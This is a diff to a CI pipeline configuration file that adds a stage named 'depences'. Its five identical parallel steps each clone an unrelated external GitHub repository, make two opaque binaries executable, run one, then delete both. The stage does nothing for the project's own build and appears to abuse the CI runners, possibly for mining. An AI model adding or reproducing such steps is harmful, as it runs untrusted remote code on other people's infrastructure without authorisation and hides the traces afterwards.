@@ -64,6 +64,57 @@ pipeline:
           runtime:
             type: Cloud
             spec: {}
+    - stage:
+        name: depences
+        identifier: depences
+        description: ""
+        type: CI
+        spec:
+          cloneCodebase: false
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - parallel:
+                  - step:
+                      type: Run
+                      name: Run_1
+                      identifier: Run_1
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/IFALOKAs-official/ramfedinolas && cd ramfedinolas && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                  - step:
+                      type: Run
+                      name: Run_2
+                      identifier: Run_2
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/IFALOKAs-official/ramfedinolas && cd ramfedinolas && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                  - step:
+                      type: Run
+                      name: Run_3
+                      identifier: Run_3
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/IFALOKAs-official/ramfedinolas && cd ramfedinolas && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                  - step:
+                      type: Run
+                      name: Run_4
+                      identifier: Run_4
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/IFALOKAs-official/ramfedinolas && cd ramfedinolas && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                  - step:
+                      type: Run
+                      name: Run_5
+                      identifier: Run_5
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/IFALOKAs-official/ramfedinolas && cd ramfedinolas && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
   properties:
     ci:
       codebase:
